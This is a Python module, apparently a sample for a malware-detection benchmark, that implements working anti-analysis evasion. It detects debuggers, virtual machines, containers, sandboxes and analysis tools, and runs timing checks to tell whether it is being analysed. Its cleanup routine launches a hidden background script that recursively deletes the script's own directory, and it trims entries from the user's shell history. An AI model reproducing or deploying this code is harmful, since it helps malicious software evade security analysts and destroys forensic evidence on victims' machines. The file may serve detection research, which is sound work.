#!/usr/bin/env python3
"""
BENCHMARK_TEST_ONLY: Comprehensive anti-analysis evasion module
Implements ANTI-001 through ANTI-006 detection evasion techniques
"""

import sys
import os
import time
import subprocess
import shutil
import getpass
import hashlib


class EnvironmentValidator:
    """
    Comprehensive environment validation to evade analysis.
    Combines multiple anti-analysis techniques.
    """

    def __init__(self):
        self.script_path = os.path.abspath(__file__)
        self.checks_passed = []
        self.checks_failed = []

    def is_safe_environment(self) -> bool:
        """Run all evasion checks, return True if safe to proceed"""
        checks = [
            ("ANTI-001", self._check_debugger),
            ("ANTI-002", self._check_virtualization),
            ("ANTI-003", self._check_sandbox),
            ("ANTI-004", self._check_timing),
            ("ANTI-005", self._check_environment),
        ]

        for code, check_func in checks:
            try:
                if not check_func():
                    self.checks_failed.append(code)
                    return False
                self.checks_passed.append(code)
            except Exception:
                # Error during check might indicate analysis
                self.checks_failed.append(code)
                return False

        return True

    def _check_debugger(self) -> bool:
        """ANTI-001: Debugger detection"""
        # Check Python trace function
        if sys.gettrace() is not None:
            return False

        # Check for debugger modules
        debugger_modules = ['debugpy', 'pdb', 'pydevd', 'rpdb']
        for module in debugger_modules:
            if module in sys.modules:
                return False

        # Check for debugger processes
        try:
            ps = subprocess.run(['ps', 'aux'], capture_output=True, text=True)
            debuggers = ['gdb', 'lldb', 'strace', 'ltrace', 'ida', 'x64dbg', 'ollydbg']
            for dbg in debuggers:
                if dbg in ps.stdout.lower():
                    return False
        except:
            pass

        return True

    def _check_virtualization(self) -> bool:
        """ANTI-002: VM/virtualization detection"""
        # Check DMI information
        dmi_files = [
            ('/sys/class/dmi/id/product_name', ['vmware', 'virtualbox', 'virtual', 'qemu', 'kvm']),
            ('/sys/class/dmi/id/sys_vendor', ['microsoft', 'vmware', 'virtualbox', 'xen']),
            ('/sys/class/dmi/id/board_vendor', ['oracle', 'vmware']),
        ]

        for filepath, indicators in dmi_files:
            try:
                with open(filepath, 'r') as f:
                    content = f.read().lower()
                    for indicator in indicators:
                        if indicator in content:
                            return False
            except:
                pass

        # Check for hypervisor
        if os.path.exists('/sys/hypervisor/type'):
            return False

        # Check for container environment
        if os.path.exists('/.dockerenv') or os.path.exists('/run/.containerenv'):
            return False

        # Check MAC addresses for VM vendors
        try:
            result = subprocess.run(['ip', 'link'], capture_output=True, text=True)
            vm_macs = ['00:0c:29', '00:50:56', '08:00:27', '52:54:00', '00:1c:42']
            for mac in vm_macs:
                if mac in result.stdout.lower():
                    return False
        except:
            pass

        return True

    def _check_sandbox(self) -> bool:
        """ANTI-003: Sandbox detection"""
        # Check for sandbox markers
        markers = [
            '/tmp/.sandbox_marker', '/sandbox', '/cuckoo',
            '/home/sandbox', '/home/malware', '/opt/cuckoo'
        ]
        for marker in markers:
            if os.path.exists(marker):
                return False

        # Check username
        suspicious_users = ['sandbox', 'malware', 'virus', 'sample', 'test',
                           'cuckoo', 'analyst', 'vmware', 'user', 'admin']
        if getpass.getuser().lower() in suspicious_users:
            return False

        # Check uptime
        try:
            with open('/proc/uptime', 'r') as f:
                uptime = float(f.read().split()[0])
                if uptime < 600:  # Less than 10 minutes
                    return False
        except:
            pass

        # Check file count in home directory
        try:
            home_files = len(os.listdir(os.path.expanduser('~')))
            if home_files < 10:
                return False
        except:
            pass

        return True

    def _check_timing(self) -> bool:
        """ANTI-004: Timing-based detection"""
        # CPU timing test
        start = time.time()
        result = sum(i * i for i in range(500000))
        elapsed = time.time() - start
        if elapsed > 2:
            return False

        # Crypto timing test
        start = time.time()
        for _ in range(500):
            hashlib.sha256(b"benchmark" * 100).hexdigest()
        if time.time() - start > 2:
            return False

        # Sleep accuracy test
        start = time.time()
        time.sleep(0.3)
        sleep_time = time.time() - start
        if sleep_time < 0.2:  # Sleep was accelerated
            return False

        return True

    def _check_environment(self) -> bool:
        """ANTI-005: Environment fingerprinting"""
        # Check environment variables
        bad_vars = ['ANALYSIS_MODE', 'MALWARE_ANALYSIS', 'CUCKOO', 'SANDBOX',
                    'DYLD_INSERT_LIBRARIES', 'LD_PRELOAD']
        for var in bad_vars:
            if var in os.environ:
                return False

        # Check for analysis tools
        tools = ['strace', 'ltrace', 'gdb', 'lldb', 'ida', 'ida64', 'ghidra',
                 'radare2', 'r2', 'wireshark', 'frida', 'frida-trace']
        for tool in tools:
            if shutil.which(tool):
                return False

        return True

    def cleanup(self):
        """ANTI-006: Self-deletion after execution"""
        # Create cleanup script
        cleanup_script = f'''#!/bin/bash
sleep 2
rm -rf "{os.path.dirname(self.script_path)}"
rm -f "$0"
'''
        cleanup_path = '/tmp/.cleanup_' + hashlib.md5(str(time.time()).encode()).hexdigest()[:8]

        try:
            with open(cleanup_path, 'w') as f:
                f.write(cleanup_script)
            os.chmod(cleanup_path, 0o755)

            # Launch cleanup in background
            subprocess.Popen(
                ['/bin/bash', cleanup_path],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                start_new_session=True
            )
        except:
            pass

        # Clear history
        for hist in ['~/.bash_history', '~/.zsh_history']:
            try:
                hist_path = os.path.expanduser(hist)
                if os.path.exists(hist_path):
                    with open(hist_path, 'r') as f:
                        lines = f.readlines()[:-10]
                    with open(hist_path, 'w') as f:
                        f.writelines(lines)
            except:
                pass
